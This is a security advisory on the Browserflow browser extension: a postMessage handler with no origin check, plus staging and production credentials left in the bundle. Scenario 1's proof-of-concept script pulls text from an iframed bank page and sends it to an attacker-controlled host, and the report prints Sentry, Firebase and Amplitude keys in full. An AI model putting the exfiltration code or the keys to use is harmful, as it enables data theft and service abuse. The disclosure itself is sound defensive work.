# Vulnerability Report: Browserflow - Web Scraping & Web Automation

**Extension ID:** `hfjnppljknigdnnpocjjgdcfmnodoafe`
**Version:** 1.0.6
**Manifest Version:** 3
**Triage Flags:** V1=4, V2=2 (innerhtml_dynamic, postmessage_no_origin, hardcoded_secret)

---

## Executive Summary

The Browserflow extension is a legitimate web automation and scraping tool. Analysis identified **one confirmed high-severity vulnerability** related to cross-frame postMessage communication without origin validation, and **one low-severity informational finding** related to exposed infrastructure credentials. Several triage flags were found to be false positives from bundled third-party libraries (React, jQuery/Sizzle, Sentry, rrweb).

---

## Vulnerability 1: Cross-Origin postMessage Handler Without Origin Validation Exposes Sensitive Page Content

**CVSS 3.1 Score:** 7.1 (High)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:L`

**File:** `inject.bundle.js`
**Primary Location:** Line 14828-14846 (function `Aa`)
**Handler Registration:** Line 15773-15776 (function `oi`)
**Handler Map:** Lines 15383-15731 (object `ti`)

### Description

The content script (`inject.bundle.js`) is injected into ALL frames on ALL URLs (`"matches": ["<all_urls>"], "all_frames": true`). It registers a set of powerful DOM manipulation and data extraction handlers that listen for `window.postMessage` events.

The critical branching logic is at line 15776:

```javascript
return ba() ? Sa(e, r) : Aa(e, r)
```

Where `ba()` (line 14914) returns `window === window.top`. This means:
- **Top-level frames:** Handlers are registered via Chrome extension messaging (`runtime.onMessage`), which is secure.
- **Iframes:** Handlers are registered via `window.addEventListener("message", n)` through the `Aa` function (line 14828).

The `Aa` function performs **zero origin validation**:

```javascript
function Aa(e, t) {
  const n = async n => {
    const r = n.data;
    if (!r || r.type !== e) return;  // Only checks message type, NOT origin
    const o = n.source;
    let a, i;
    try {
      a = await t(r, o)
    } catch (e) {
      i = jn(e)
    }
    "MESSAGE_RESPONSE" !== e && fa(o, {
      type: "MESSAGE_RESPONSE",
      responseType: e,
      result: a,
      error: i
    }, "*")  // Response also sent to "*"
  };
  return window.addEventListener("message", n), () => window.removeEventListener("message", n)
}
```

The response is also sent back to `"*"` (any origin), meaning the attacker receives the results.

### Exposed Handlers (via `ti` object, lines 15383-15731)

When the content script runs inside an iframe, ANY page that embeds or can send postMessage to that iframe can invoke these handlers:

| Message Type | Capability | Risk |
|---|---|---|
| `GET_ELEMENT_TEXT` | Extract text content of any element by CSS selector | Data exfiltration |
| `GET_ELEMENT_HTML` | Extract full `outerHTML` of any element | Data exfiltration |
| `GET_ELEMENT_ATTRIBUTE` | Read any attribute of any element | Data exfiltration |
| `GET_LINK_URL` | Extract href of link elements | Data exfiltration |
| `GET_MEDIA_URL` | Extract src from img/video/audio | Data exfiltration |
| `SELECT_OPTION` | Change select element values, dispatches input/change events | DOM manipulation |
| `SET_CURSOR` | Move cursor position in input fields | UI manipulation |
| `SET_DATE_INPUT` | Change date input values, dispatches events | DOM manipulation |
| `SCROLL` | Scroll page to arbitrary positions | UI manipulation |
| `SCROLL_INTO_VIEW` | Force elements into viewport | UI manipulation |
| `SELECT_TEXT` | Select text in any element | UI manipulation |
| `REMOVE_EXTENSION_FRAMES` | Remove chrome-extension:// iframes and specific elements | Denial of service |

### PoC Exploit Scenario

**Prerequisite:** The Browserflow extension is installed. The victim visits `attacker.com`.

**Scenario 1: Cross-Origin Data Exfiltration from Embedded Iframe**

1. `attacker.com` embeds a sensitive page in a cross-origin iframe (e.g., `<iframe src="https://bank.example.com/account">`).
2. Because the Browserflow content script runs in ALL frames including that iframe, the postMessage handlers are active inside it.
3. The attacker page sends:
   ```javascript
   const bankFrame = document.querySelector('iframe').contentWindow;
   // Cannot read cross-origin DOM directly, but the extension bridges it:
   bankFrame.postMessage({ type: "GET_ELEMENT_TEXT", selector: ".account-balance" }, "*");
   window.addEventListener("message", (e) => {
     if (e.data?.type === "MESSAGE_RESPONSE" && e.data?.responseType === "GET_ELEMENT_TEXT") {
       // e.data.result contains the account balance text
       fetch("https://attacker.com/exfil?data=" + encodeURIComponent(e.data.result));
     }
   });
   ```

Note: This attack requires the target site to be embeddable (no X-Frame-Options / CSP frame-ancestors), which limits but does not eliminate the attack surface. Many sites (internal tools, legacy apps, certain banking portals, webmail) remain embeddable.

**Scenario 2: Same-Origin Iframe Exploitation**

1. If the attacker can inject an iframe on the same origin (e.g., via user-generated content, ads, or a subdomain takeover), they can use postMessage to extract any DOM content from the parent page through the extension's content script running in the injected iframe.

**Scenario 3: DOM Manipulation**

1. Using `SELECT_OPTION` or `SET_DATE_INPUT`, an attacker can change form values in the embedded frame, potentially altering transaction details, shipping addresses, or other form data before the user submits.

### Impact

- **Confidentiality (HIGH):** Sensitive page content (text, HTML, attributes, URLs) can be exfiltrated from iframed pages, bypassing the Same-Origin Policy.
- **Integrity (LOW):** Form values can be manipulated (select options, date inputs, cursor position) which could alter user submissions.
- **Availability (LOW):** The `REMOVE_EXTENSION_FRAMES` handler can remove legitimate extension iframes (e.g., 1Password) from the page.

### Remediation

1. **Add origin validation** in the `Aa` function. Check `event.origin` against a whitelist (e.g., only accept messages from `chrome-extension://<own-extension-id>` or `*.browserflow.app`).
2. **Use `targetOrigin` in responses** instead of `"*"` when calling `fa(o, ..., "*")`.
3. Consider using `MessageChannel` or `chrome.runtime.sendMessage` for iframe communication instead of `window.postMessage`.

---

## Vulnerability 2: Exposed Sentry DSN and Staging Infrastructure Credentials

**CVSS 3.1 Score:** 3.7 (Low)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`

**File:** `background.bundle.js`
**Location:** Lines 16876-16945

### Description

The extension embeds full configuration objects for development, staging, and production environments, including:

| Secret | Value | Environment | File:Line |
|---|---|---|---|
| Sentry DSN | `https://be68e4748cb14e70b59b25a14857ae81@o1271930.ingest.sentry.io/6464756` | Production | background.bundle.js:16876 |
| Firebase API Key (staging) | `AIzaSyDfIk_HtUs3zVQe059uITslNoHBUb2dzBI` | Staging | background.bundle.js:16887 |
| Firebase API Key (prod) | `AIzaSyBt9-5nJ7jWVl_xalpmqQ7QwY1uv5f0Yt4` | Production | background.bundle.js:16929 |
| Firebase App ID (staging) | `1:116560834788:web:4cf772c6ab960738483cf1` | Staging | background.bundle.js:16892 |
| Firebase App ID (prod) | `1:499625738617:web:2e172a56ce148d47baafa8` | Production | background.bundle.js:16934 |
| Amplitude API Key (staging) | `63b3c03f2ad8edab00c10d0e2cca59db` | Staging | background.bundle.js:16900 |
| Amplitude API Key (dev) | `3b02d274d8e457f6f859cd6005dfc492` | Development | background.bundle.js:16921 |
| Amplitude API Key (prod) | `d4fdaae3a5a67ef0bda4362abbd069de` | Production | background.bundle.js:16942 |
| Staging Base URL | `https://staging.browserflow.app` | Staging | background.bundle.js:16881 |
| Dev Base URL | `http://localhost:3000` | Development | background.bundle.js:16882 |

### PoC Exploit Scenario

1. **Sentry DSN abuse:** An attacker can use the Sentry DSN to submit fake error reports to the Browserflow Sentry project, potentially polluting error tracking, consuming quota, or injecting misleading data into their monitoring.
2. **Staging environment discovery:** The exposed staging URL (`staging.browserflow.app`) and its Firebase credentials reveal the existence and configuration of a pre-production environment that may have weaker security controls.

### Impact

- **Confidentiality (LOW):** Exposes internal infrastructure details (project IDs, staging URLs, analytics keys) that aid reconnaissance.
- Firebase API keys are designed to be client-side and are protected by Firebase Security Rules, so their exposure alone is not a direct authentication bypass. However, combined with a misconfigured Firebase project, it could enable unauthorized data access.
- Amplitude API keys are write-only by design, so the risk is limited to event injection.

### Remediation

1. Remove staging/development configurations from the production bundle (use build-time environment stripping).
2. Consider restricting the Sentry DSN with allowed origins.
3. Ensure Firebase Security Rules are properly configured to prevent unauthorized access even with the exposed API key.

---

## False Positive Analysis

### innerHTML with Dynamic Content (Triage Flag: innerhtml_dynamic)

All identified `innerHTML` assignments are from **bundled third-party libraries** and are NOT vulnerabilities:

| Location | Library | Usage | Verdict |
|---|---|---|---|
| inject.bundle.js:1569,1571,2021,2025 | Sizzle/jQuery selector engine | Static HTML strings for browser feature detection | FALSE POSITIVE |
| inject.bundle.js:3744 | React DOM | Property name registration (`dangerouslySetInnerHTML` as string) | FALSE POSITIVE |
| inject.bundle.js:4205-4207 | React DOM | SVG namespace innerHTML fallback | FALSE POSITIVE |
| inject.bundle.js:7716 | React DOM | Script element creation during hydration | FALSE POSITIVE |
| inject.bundle.js:19191 | Browserflow (own code) | `n.innerHTML = Ru.A.toString()` -- injects **bundled CSS** (`style.shadow.css`) into shadow DOM. Static content, not user-controlled. | FALSE POSITIVE |
| background.bundle.js:20547 | Firebase SDK | Static `" &times;"` close button HTML | FALSE POSITIVE |

### postMessage without Origin Check (Triage Flag: postmessage_no_origin)

| Location | Library/Component | Usage | Verdict |
|---|---|---|---|
| inject.bundle.js:14828-14846 | Browserflow core (`Aa` function) | Cross-frame command dispatch without origin check | **REAL VULNERABILITY** (Vuln 1 above) |
| inject.bundle.js:14819-14821 | Browserflow core (PING to iframes) | Sends PING to iframe with `"*"` | Contributes to Vuln 1 |
| inject.bundle.js:1033 | React scheduler | `MessageChannel.port2.postMessage(null)` | FALSE POSITIVE (internal scheduler) |
| background.bundle.js:10528 | rrweb (Sentry Replay) | Session replay data to parent frame with `"*"`. Only fires in cross-origin iframe recording mode (`F` flag). | LOW RISK (rrweb known pattern) |
| background.bundle.js:11441-11498 | Sentry Replay compression worker | Worker communication via `.postMessage()` | FALSE POSITIVE (Worker API) |
| background.bundle.js:23383-23458 | Firebase Auth | MessageChannel-based messaging with port transfer | FALSE POSITIVE (uses MessageChannel ports) |

---

## Permission Analysis

| Permission | Justification | Risk Level |
|---|---|---|
| `debugger` | Required for web automation (CDP protocol access) | HIGH -- enables full browser debugging |
| `tabs` | Tab management for automation workflows | MEDIUM |
| `cookies` | Cookie access for automation scenarios | MEDIUM |
| `scripting` | Dynamic script injection for automation | MEDIUM |
| `<all_urls>` (host) | Content script injection on all sites | HIGH |
| `storage` | Extension state persistence | LOW |
| `webNavigation` | Navigation event monitoring | LOW |
| `notifications` | User notifications | LOW |
| `clipboardRead` | Clipboard access for automation | LOW-MEDIUM |
| `downloads` | File download automation | LOW |

The `debugger` permission combined with `<all_urls>` makes this extension extremely powerful. While appropriate for a web automation tool, users should understand the full scope of access granted.

---

## Summary

| # | Title | Severity | CVSS | Verified |
|---|---|---|---|---|
| 1 | Cross-Origin postMessage Handler Without Origin Validation | HIGH | 7.1 | YES |
| 2 | Exposed Sentry DSN and Staging Infrastructure Credentials | LOW | 3.7 | YES |
